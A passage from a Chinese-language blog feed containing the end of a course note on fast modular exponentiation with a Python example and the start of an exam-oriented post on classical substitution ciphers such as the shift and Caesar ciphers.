class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9869199999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869199999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9869199999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869199999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869199999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869199999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p><p>通过这种表示方式，可以避免直接计算大幂次，而是通过迭代平方来逐步得到结果。</p><p>应用快速幂算法的步骤如下：</p><ol><li>初始化结果为1：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">result=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></li><li>当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>x</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">exp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span></span></span></span>大于0时，重复以下步骤：<ul><li>如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>x</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">exp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span></span></span></span>是奇数（即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>x</mi><mi>p</mi><mi mathvariant="normal">%</mi><mn>2</mn><mo>=</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">exp\%2==1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mord">%</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>），则更新结果：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mo>=</mo><mo stretchy="false">(</mo><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mo separator="true">⋅</mo><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mi>m</mi><mi>o</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">result=(result·base)\%mod</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">t</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mclose">)</span><span class="mord">%</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span></span></span></span></li><li>将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">base</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span></span></span></span>平方，并对<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">mod</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span></span></span></span>取模：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mo>=</mo><mo stretchy="false">(</mo><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mo separator="true">⋅</mo><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mi>m</mi><mi>o</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">base=(base·base)\% mod</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mclose">)</span><span class="mord">%</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span></span></span></span>。</li><li>将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>x</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">exp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span></span></span></span>右移一位（即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>x</mi><mi>p</mi><mo>=</mo><mi>e</mi><mi>x</mi><mi>p</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">exp=exp//2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mord">/</span><span class="mord">/</span><span class="mord">2</span></span></span></span>）</li></ul></li></ol><p>为方便理解，这里给出实现快速幂算法的Python代码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fast_pow</span>(<span class="params">base, exp, mod</span>):</span><br><span class="line">    result = <span class="number">1</span>  <span class="comment"># 初始化结果</span></span><br><span class="line">    base = base % mod  <span class="comment"># 确保 base 小于 mod，避免不必要的大数运算</span></span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp % <span class="number">2</span> == <span class="number">1</span>:  <span class="comment"># 如果 exp 是奇数</span></span><br><span class="line">            result = (result * base) % mod  <span class="comment"># 更新结果</span></span><br><span class="line">        base = (base * base) % mod  <span class="comment"># 将 base 平方</span></span><br><span class="line">        exp //= <span class="number">2</span>  <span class="comment"># 将 exp 右移一位</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">base = <span class="number">3</span></span><br><span class="line">exp = <span class="number">13</span></span><br><span class="line">mod = <span class="number">11</span></span><br><span class="line"><span class="built_in">print</span>(fast_pow(base, exp, mod))  <span class="comment"># 输出应为 5，因为 3^13 ≡ 5 (mod 11)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面我们运用费马小定理+快速幂算法来解一道题。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/IMG_20240623_200107.jpg" alt="IMG_20240623_200107" style="zoom: 25%;" /><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/101292197_p0.jpg" alt="101292197_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> 课堂随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 扩展欧几里得算法 </tag>
            
            <tag> 费马小定理 </tag>
            
            <tag> 快速幂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈古典密码</title>
      <link href="/posts/28dc7859a946/"/>
      <url>/posts/28dc7859a946/</url>
      
        <content type="html"><![CDATA[<h1 id="浅谈古典密码"><a class="markdownIt-Anchor" href="#浅谈古典密码"></a> 浅谈古典密码</h1><p>根据密码学的考纲和PPT，简单的归纳一下古典密码学的做法。一般来说都会作为大题考察，因为考察近现代密码用手算不是很现实……</p><p>代替密码是指先建立一个替换表，加密时将需要加密的明文依次通过查表，替换为相应的字符。明文字符被逐个替换后，生成无任何意义的字符串，即密文。代替密码的密钥就是其替换表。</p><p>根据密码算法加解密时使用替换表多少的不同，代替密码又可分为单表代替密码和多表代替密码。</p><ul><li>单表代替密码：密码算法加解密时使用一个固定的替换表</li><li>多表代替密码：密码算法加解密时使用多个替换表</li></ul><p>我们简单的把古典密码分为单标代替和多表代替来讨论。单表代替的重点是仿射密码，多表代替的重点是希尔密码。虽然古典密码相对比较简单，但还是推荐读者多动笔计算一下。</p><p>那么就开始吧。</p><h2 id="单表代替"><a class="markdownIt-Anchor" href="#单表代替"></a> 单表代替</h2><p>单表代替密码密钥量很小，不能抵抗穷尽搜索攻击。且没有将明文字母出现的概率掩藏起来，很容易受到统计分析的攻击。</p><p>单表代替密码主要介绍三种：</p><ul><li>移位密码</li><li>使用密钥的单表代替密码</li><li>仿射密码</li></ul><h3 id="移位密码"><a class="markdownIt-Anchor" href="#移位密码"></a> 移位密码</h3><p>移位密码非常简单，就是把明文对应的字符移动对应的位数即可得到密文，再移回来就可以得到明文。</p><p>加密变换：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><mo stretchy="false">{</mo><mi>E</mi><mo>:</mo><msub><mi>Z</mi><mn>26</mn></msub><mo>→</mo><msub><mi>Z</mi><mn>26</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mi>p</mi><mo>+</mo><mi>k</mi><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mi>p</mi><mo>∈</mo><mi>P</mi><mo separator="true">,</mo><mi>k</mi><mo>∈</mo><mi>K</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">E=\{E:Z_{26}\rightarrow Z_{26},E_k(p)=p+k(\bmod26)|p\in P,k\in K \}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span><span class="mord">∣</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">}</span></span></span></span></p><p>解密变换：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mo>=</mo><mo stretchy="false">{</mo><mi>D</mi><mo>:</mo><msub><mi>Z</mi><mn>26</mn></msub><mo>→</mo><msub><mi>Z</mi><mn>26</mn></msub><mo separator="true">,</mo><msub><mi>D</mi><mi>k</mi></msub><mo>=</mo><mi>c</mi><mo>−</mo><mi>k</mi><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mi>c</mi><mo>∈</mo><mi>C</mi><mo separator="true">,</mo><mi>k</mi><mo>∈</mo><mi>K</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">D=\{D:Z_{26}\rightarrow Z_{26},D_k=c-k(\bmod 26)|c\in C,k\in K \}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span><span class="mord">∣</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">}</span></span></span></span></p><p>当移位密码的密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">k=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>时，就是著名的凯撒密码。</p><p>此时：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>e</mi><mi>a</mi><mi>s</mi><mi>a</mi><mi>r</mi><mtext> </mtext><mi>c</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi><mo>→</mo><mi>F</mi><mi>D</mi><mi>H</mi><mi>V</mi><mi>D</mi><mi>U</mi><mtext> </mtext><mi>F</mi><mi>L</mi><mi>S</mi><mi>K</mi><mi>H</mi><mi>U</mi></mrow><annotation encoding="application/x-tex">ceasar\ cipher\rightarrow FDHVDU\ FLSKHU</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace"> </span><span class="mord mathnormal">c</span><span class="mord mathnormal">i</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></p><h3 id="使用密钥的单表代替加密"><a class="markdownIt-Anchor" href="#使用密钥的单表代替加密"></a> 使用密钥的单表代替加密</h3><p>选用一个英文短语或者单词串作为密钥，去掉其中重复的字母得到一个无重复字母的字母串，然后将字母表中的其他字母依次写于此字母串之后，就可构造出一个字母代替表。</p><h4 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 